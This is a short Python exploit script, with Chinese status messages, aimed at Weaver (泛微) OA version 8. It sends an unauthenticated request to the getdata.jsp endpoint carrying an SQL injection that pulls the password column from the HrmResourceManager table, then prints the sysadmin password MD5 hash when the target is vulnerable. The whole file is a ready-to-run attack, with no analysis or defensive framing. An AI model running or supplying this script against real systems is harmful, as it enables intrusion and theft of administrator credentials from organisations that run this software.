import time

import requests
import urllib3


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    target_url = target_url + "js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
    print(now_time() + " [INFO]     正在检测泛微OA E-Office 8_Sql漏洞")
    try:
        urllib3.disable_warnings()
        res = requests.get(url=target_url, headers=headers, verify=False, timeout=10)
        if res.status_code == 200 and 'html' not in res.text:
            print(now_time() + " [SUCCESS]     存在V8前台SQL注入")
            print(now_time() + " [SUCCESS]     用户: sysadmin 密码MD5: {}".format(res.text.strip()))
        else:
            print(now_time() + " [WARNING]  不存在V8前台SQL注入")
    except Exception as e:
        print(now_time() + " [ERROR]    目标请求失败 ")
